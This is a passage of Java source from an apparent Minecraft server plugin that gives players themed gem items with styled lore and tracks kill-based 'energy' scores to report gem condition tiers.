                LifeGemItemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "" + ChatColor.BOLD + "ʟɪғᴇ" + " " + ChatColor.GRAY + "ɢᴇᴍ");
                LifeGemItemMeta.setLore(Arrays.asList(
                        ChatColor.WHITE + "" + ChatColor.BOLD + "ᴄᴏɴᴛʀᴏʟ ᴛʜᴇ ʙᴀʟᴀɴᴄᴇ ᴏғ ʟɪғᴇ " + ChatColor.GRAY + "(" + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + ")", net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀssɪᴠᴇs", net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + " \uD83D\uDD3A" + ChatColor.GRAY + "Feed animals and grow plants", ChatColor.GRAY + " by crouch clicking with bare hand, 1.5x dmg", ChatColor.GRAY + " to undead mobs, 1.5x saturation", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(130, 255, 243)) + "" + ChatColor.BOLD + "ᴀʙɪʟɪᴛʏ", net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "Vitality Vortex" + ChatColor.GRAY + ": suck the life around you and turn", ChatColor.GRAY + " it into resistence,saturation & regeneration", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(173, 255, 243)) + "" + ChatColor.BOLD + "ᴘᴏᴡᴇʀs", net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "\uD83D\uDD2E " + ChatColor.WHITE + ChatColor.BOLD + "required"
                ));
                LifeGemItemMeta.setCustomModelData(4);
                LifeGem.setItemMeta(LifeGemItemMeta);
                player.getInventory().addItem(LifeGem);
                data.set(FɪʀsᴛJᴏɪɴ, PersistentDataType.INTEGER, 1);
                data.set(BʟɪssEɴᴇʀɢʏ_6, PersistentDataType.INTEGER, 1);
            } else if (GemRandom == 4) {
                ItemStack WealthGem = new ItemStack(Material.AMETHYST_SHARD);
                ItemMeta WealthGemItemMeta = WealthGem.getItemMeta();
                WealthGemItemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "" + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ" + " " + ChatColor.GRAY + "ɢᴇᴍ");
                WealthGemItemMeta.setLore(Arrays.asList(
                        ChatColor.WHITE + "" + ChatColor.BOLD + "ғᴜᴇʟ ᴀ ᴇᴍᴘɪʀᴇ " + ChatColor.GRAY + "(" + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + ")",
                        net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀssɪᴠᴇs", net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + " \uD83D\uDD3A " + ChatColor.GRAY + "Cheaper villager trades, Luck", ChatColor.GRAY + "Auto enchants looting, fortune & mending", ChatColor.GRAY + "get one more ore for every 3 ores mined", ChatColor.GRAY + "Chip enemies durability", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(130, 255, 243)) + "" + ChatColor.BOLD + "ᴀʙɪʟɪᴛʏ", net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "" + "Pockets" + ChatColor.GRAY + ": 9 extra slots of storage/", ChatColor.GRAY + " on death you drop 50% of items in your pocket", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(173, 255, 243)) + "" + ChatColor.BOLD + "ᴘᴏᴡᴇʀs", net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83D\uDD2E " + ChatColor.WHITE + ChatColor.BOLD + "required"
                ));
                WealthGemItemMeta.setCustomModelData(12);
                WealthGem.setItemMeta(WealthGemItemMeta);
                player.getInventory().addItem(WealthGem);
                data.set(FɪʀsᴛJᴏɪɴ, PersistentDataType.INTEGER, 1);
                data.set(BʟɪssEɴᴇʀɢʏ_6, PersistentDataType.INTEGER, 1);
            } else if (GemRandom == 5) {
                ItemStack PuffGem = new ItemStack(Material.AMETHYST_SHARD);
                ItemMeta PuffGemItemMeta = PuffGem.getItemMeta();
                PuffGemItemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "" + ChatColor.BOLD + "ᴘᴜғғ" + " " + ChatColor.GRAY + "ɢᴇᴍ");
                PuffGemItemMeta.setLore(Arrays.asList(
                        net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "" + ChatColor.BOLD + "ʙᴇ ᴛʜᴇ ʙɪɢɢᴇsᴛ ʙɪʀᴅ " + ChatColor.GRAY + "(" + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + ")", net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀssɪᴠᴇs", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD3A" + ChatColor.GRAY + " No fall damage", ChatColor.GRAY + "Auto Enchant Power 3 & Punch", ChatColor.GRAY + " ", net.md_5.bungee.api.ChatColor.of(new Color(130, 255, 243)) + "" + ChatColor.BOLD + "ᴀʙɪʟɪᴛʏ", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "Double Jump" + ChatColor.GRAY + ": jump again whilst in the air", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(173, 255, 243)) + "" + ChatColor.BOLD + "ᴘᴏᴡᴇʀs", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD2E " + ChatColor.WHITE + ChatColor.BOLD + "required"
                ));
                PuffGemItemMeta.setCustomModelData(6);
                PuffGem.setItemMeta(PuffGemItemMeta);
                player.getInventory().addItem(PuffGem);
                data.set(FɪʀsᴛJᴏɪɴ, PersistentDataType.INTEGER, 1);
                data.set(BʟɪssEɴᴇʀɢʏ_6, PersistentDataType.INTEGER, 1);
            } else if (GemRandom == 7) {
                ItemStack FireGem = new ItemStack(Material.AMETHYST_SHARD);
                ItemMeta FireGemItemMeta = FireGem.getItemMeta();
                FireGemItemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(255, 140, 0)) + "" + ChatColor.BOLD + "ғɪʀᴇ" + " " + ChatColor.GRAY + "ɢᴇᴍ");
                FireGemItemMeta.setLore(Arrays.asList(
                        net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "" + ChatColor.BOLD + "ᴍᴀɴɪᴘᴜʟᴀᴛᴇ ғɪʀᴇ " + ChatColor.GRAY + "(" + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + ")", net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀꜱꜱɪᴠᴇꜱ", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD3A" + ChatColor.GRAY + " No fall damage", ChatColor.GRAY + "Auto Smelting, Fire Res, Ignition 15%", ChatColor.GRAY + "Auto Enchant Flame & Fire Aspect 2 ", net.md_5.bungee.api.ChatColor.of(new Color(130, 255, 243)) + "" + ChatColor.BOLD + "ᴀʙɪʟɪᴛʏ", net.md_5.bungee.api.ChatColor.of(new Color(255, 140, 0)) + "Crisp" + ChatColor.GRAY + ": create a area that burns enemies", ChatColor.GRAY + "and autosmelts objects thrown in the zone", net.md_5.bungee.api.ChatColor.of(new Color(173, 255, 243)) + "" + ChatColor.BOLD + "ᴘᴏᴡᴇʀs", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD2E " + ChatColor.WHITE + ChatColor.BOLD + "required"
                ));
                FireGemItemMeta.setCustomModelData(2);
                FireGem.setItemMeta(FireGemItemMeta);
                player.getInventory().addItem(FireGem);
                data.set(FɪʀsᴛJᴏɪɴ, PersistentDataType.INTEGER, 1);
                data.set(BʟɪssEɴᴇʀɢʏ_6, PersistentDataType.INTEGER, 1);
            } else if (GemRandom == 8) {
                ItemStack FluxGem = new ItemStack(Material.AMETHYST_SHARD);
                ItemMeta FluxGemItemMeta = FluxGem.getItemMeta();
                FluxGemItemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(255, 140, 0)) + "" + ChatColor.BOLD + "ғɪʀᴇ" + " " + ChatColor.GRAY + "ɢᴇᴍ");
                FluxGemItemMeta.setLore(Arrays.asList(
                        net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "" + ChatColor.BOLD + "ᴇᴠᴇʀʏᴛʜɪɴɢ ɪѕ ᴀ ꜰʟᴜᴄᴛᴜᴀᴛɪᴏɴ " + ChatColor.GRAY + "(" + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + ")", net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀꜱꜱɪᴠᴇꜱ", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD3A" + ChatColor.GRAY + " Flow state", ChatColor.GRAY + "the repetition of actions", ChatColor.GRAY + "increases its efficiency and capability. once ", ChatColor.GRAY + "you stop repeating the action, flowstate resets ", ChatColor.GRAY + "flowstate applies to damage, mining and movement ", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD3A" + ChatColor.GRAY + " Tireless", ChatColor.GRAY + "immunity to weakness, slowness and hunger ", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD3A" + ChatColor.GRAY + " Conduction", ChatColor.GRAY + "pass through copper blocks ", ChatColor.GRAY + "like a current, blocks must be within 5 blocks of eachother ", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD3A" + ChatColor.GRAY + " Charged", ChatColor.GRAY + "immune to charged creepers, and projectiles ", ChatColor.GRAY + "like arrows have a chance to stun ", net.md_5.bungee.api.ChatColor.of(new Color(130, 255, 243)) + "" + ChatColor.BOLD + "ᴀʙɪʟɪᴛʏ", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "Static Burst" + ChatColor.GRAY + ": the last 2 minutes of damage", ChatColor.GRAY + "recieved is stored, and can be released all at once", net.md_5.bungee.api.ChatColor.of(new Color(173, 255, 243)) + "" + ChatColor.BOLD + "ᴘᴏᴡᴇʀs", net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD2E " + ChatColor.WHITE + ChatColor.BOLD + "required"
                ));
                FluxGemItemMeta.setCustomModelData(16);
                FluxGem.setItemMeta(FluxGemItemMeta);
                player.getInventory().addItem(FluxGem);
                data.set(FɪʀsᴛJᴏɪɴ, PersistentDataType.INTEGER, 1);
                data.set(BʟɪssEɴᴇʀɢʏ_6, PersistentDataType.INTEGER, 1);
            }
        }
    }

    private int getRandomNumber() {
        return random.nextInt(8) + 1;
    }


    private final HashMap<UUID, Integer> BlissEnergyGemHealth = new HashMap<>();

    @EventHandler
    public void BlissEnergySystem(PlayerDeathEvent event) {
        Player PlayerKilled = event.getEntity();
        Player PlayerKiller = PlayerKilled.getKiller();
        if (PlayerKiller != null) {
            UUID killerUUID = PlayerKiller.getUniqueId();
            int currentScore = BlissEnergyGemHealth.getOrDefault(killerUUID, 0);
            currentScore++;
            BlissEnergyGemHealth.put(killerUUID, currentScore);
            PlayerKiller.sendMessage(ChatColor.GREEN + "Your new score is: " + currentScore);
            Inventory inventory = PlayerKiller.getInventory();
            for (int i = 0; i < inventory.getSize(); i++) {
                ItemStack item = inventory.getItem(i);
                if (item != null && item.getType() == Material.PRISMARINE_SHARD) {
                    ItemMeta itemMeta = item.getItemMeta();
                    if (itemMeta != null && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("sᴛʀᴇɴɢᴛʜ ɢᴇᴍ")) {
                        if (currentScore == 33) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "5");
                        }
                        if (currentScore == 30) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "4");
                        }
                        if (currentScore == 27) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "3");
                        }
                        if (currentScore == 24) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "2");
                        }
                        if (currentScore == 21) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "1");
                        }
                        if (currentScore == 18) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + ");
                        }
                        if (currentScore == 15) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine");
                        }
                        if (currentScore == 12) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(87, 255, 143)) + "Scratched");
                        }
                        if (currentScore == 9) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(121, 88, 219)) + "Cracked");
                        }
                        if (currentScore == 6) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(255, 201, 41)) + "Damaged");
                        }
                        if (currentScore == 3) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Ruined");
                        }
                    }
                    if (itemMeta != null && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("sᴘᴇᴇᴅ ɢᴇᴍ")) {
                        if (currentScore == 33) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "5");
                        }
                        if (currentScore == 30) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "4");
                        }
                        if (currentScore == 27) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "3");
                        }
                        if (currentScore == 24) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "2");
                        }
                        if (currentScore == 21) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "1");
                        }
                        if (currentScore == 18) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + ");
                        }
                        if (currentScore == 15) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine");
                        }
                        if (currentScore == 12) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(87, 255, 143)) + "Scratched");
                        }
                        if (currentScore == 9) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(121, 88, 219)) + "Cracked");
                        }
                        if (currentScore == 6) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(255, 201, 41)) + "Damaged");
                        }
                        if (currentScore == 3) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + ChatColor.BOLD + "sᴘᴇᴇᴅ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Ruined");
                        }
                    }
                    if (itemMeta != null && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ʟɪғᴇ ɢᴇᴍ")) {
                        if (currentScore == 33) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "5");
                        }
                        if (currentScore == 30) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "4");
                        }
                        if (currentScore == 27) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "3");
                        }
                        if (currentScore == 24) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "2");
                        }
                        if (currentScore == 21) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "1");
                        }
                        if (currentScore == 18) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + ");
                        }
                        if (currentScore == 15) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine");
                        }
                        if (currentScore == 12) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(87, 255, 143)) + "Scratched");
                        }
                        if (currentScore == 9) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(121, 88, 219)) + "Cracked");
                        }
                        if (currentScore == 6) {
